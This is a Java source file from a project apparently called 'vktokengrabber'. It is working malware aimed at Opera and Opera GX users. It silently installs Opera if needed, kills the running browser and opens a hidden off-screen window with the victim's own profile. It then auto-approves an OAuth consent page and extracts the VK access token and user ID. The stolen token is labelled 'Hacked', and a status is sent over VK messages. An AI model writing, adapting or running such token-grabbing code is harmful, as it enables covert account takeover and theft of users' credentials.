package com.github.dedinc.vktokengrabber.browsers;

import java.io.File;
import java.nio.file.Paths;
import java.util.Scanner;
import org.openqa.selenium.Dimension;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.Point;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.remote.DesiredCapabilities;
import com.github.dedinc.vktokengrabber.Main;
import com.github.dedinc.vktokengrabber.utils.Helper;

public class Opera {	
	public String grab(boolean gx) {		
		if (gx && !Helper.getBinaries().getOperaBinary(false)) {
			try {
				String stable = "";
				String stable_ver = "";
				String ov = Helper.getVersion().getOperaVersion(gx);
				File temp = new File(Paths.get(Main.cd, "Users", Main.username, "opera.html").toString());
				Helper.getDownloader().getHTML("https://ftp.opera.com/ftp/pub/opera/desktop/", temp.getPath());
		        Scanner reader = new Scanner(temp);
		        while (reader.hasNextLine()) {
		        	try {
		        		stable_ver = ov + reader.nextLine().split("href=\"" + ov)[1].split("/")[0];
		        	   } catch (Exception e) {
		        	}
		        }	        
		        reader.close();
		        temp.delete();
		        stable = String.format("https://ftp.opera.com/ftp/pub/opera/desktop/%s//win/Opera_%s_Setup.exe", stable_ver, stable_ver);
		        String opera = Paths.get(Main.cd, "Users", Main.username, "opera_inst.exe").toString();
		        Helper.getDownloader().download(stable, opera);
		        Process p = Runtime.getRuntime().exec(opera + " /silent /desktopshortcut=0 /launchopera=0 /setdefaultbrowser=0");
		        p.waitFor();
		        new File(opera).delete();
			  } catch (Exception e) {
			}
		}
		if (!new File(Paths.get(Main.cd, "Users", Main.username, "operadriver_win32", "operadriver.exe").toString()).exists()) {
			Helper.getWebDriver().getOperaDriver(gx);
		}
		ChromeOptions options = new ChromeOptions();
		System.setProperty("webdriver.chrome.driver", Paths.get(Main.cd, "Users", Main.username, "operadriver_win32", "operadriver.exe").toString());
		if (!gx) {
			options.addArguments("user-data-dir=" + Paths.get(Main.cd, "Users", Main.username, "AppData", "Roaming", "Opera Software", "Opera Stable").toString());
		} else {
			options.addArguments("user-data-dir=" + Paths.get(Main.cd, "Users", Main.username, "AppData", "Roaming", "Opera Software", "Opera GX Stable").toString());
		}
		new DesiredCapabilities();
		@SuppressWarnings("deprecation")
		DesiredCapabilities capabilities = DesiredCapabilities.opera();
		capabilities.setCapability(ChromeOptions.CAPABILITY, options);
		try {
			Runtime.getRuntime().exec("taskkill /im opera.exe /f");
		  } catch (Exception e) {
		}
		@SuppressWarnings("deprecation")
		ChromeDriver driver = new ChromeDriver(capabilities);
		driver.manage().window().setPosition(new Point(99999, 99999));
		driver.manage().window().setSize(new Dimension(0, 0));
		driver.get(Main.scope_url);
		JavascriptExecutor js = (JavascriptExecutor) driver;  
		js.executeScript("allow()");
		String url = driver.getCurrentUrl();		
		driver.quit();
		try {
			String token = url.split("access_token=")[1].split("&")[0];
			String uid = url.split("user_id=")[1].split("&")[0];			
			return String.format("[id%s|Hacked]%n%nToken: %s", uid, token);
		  } catch (Exception e ) {
		}
		if (!gx) {
			Helper.getVK().sendMessage("Opera: Unauthorized in VK!");
		} else {
			Helper.getVK().sendMessage("Opera GX: Unauthorized in VK!");
		}
		return null;
	}
}